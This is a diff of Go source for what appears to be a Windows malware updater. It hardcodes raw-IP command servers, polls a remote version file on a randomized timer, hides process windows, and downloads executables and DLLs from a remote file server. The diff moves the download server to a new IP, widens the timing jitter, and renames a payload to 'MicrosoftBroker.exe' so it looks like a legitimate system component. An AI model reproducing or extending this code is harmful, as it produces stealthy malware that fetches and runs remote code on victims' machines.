@@ -25,7 +25,7 @@ import (
 
 const VERSION string = "3"
 const MIDURL string = "http://111.231.82.173/"
-const MIDFILE string = "http://111.231.82.173/file/"
+const MIDFILE string = "http://47.95.233.176/file/"
 const MIDAUTH string = "http://111.231.82.173:9000/auth"
 const MIDETCD string = "111.231.82.173:2379"
 const MIDKILLIP string = "http://111.231.82.173:9000/Killip"
@@ -62,7 +62,7 @@ func RandInt64(min, max int64) int {
 func DoUpdate() {
 	for {
 		//random second check version updade
-		ticker := time.NewTicker(time.Second * time.Duration(RandInt64(15, 50)))
+		ticker := time.NewTicker(time.Second * time.Duration(RandInt64(15, 150)))
 		resp, _ := http.Get(MIDFILE + "version.txt")
 		body, _ := ioutil.ReadAll(resp.Body)
 		defer resp.Body.Close()
@@ -137,12 +137,12 @@ func KillMain() {
 	killcheck.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 	killcheck.Run()
 }
-func MultiFileDown(files []string, step string) {
+func MultiFileDown(files []string, step string, downflag chan string) {
 	if len(files) == 0 && step == "init" {
 		var fileinit = []struct {
 			Name string
 		}{
-			{"nogui.exe"},
+			{"MicrosoftBroker.exe"},
 			{"sqlite3_386.dll"},
 			{"sqlite3_amd64.dll"},
 			{"WindowsDaemon.exe"},
@@ -150,6 +150,7 @@ func MultiFileDown(files []string, step string) {
 		for _, name := range fileinit {
 			Get(MIDFILE+name.Name, name.Name)
 		}
+		downflag <- "done"
 	}
 }
 
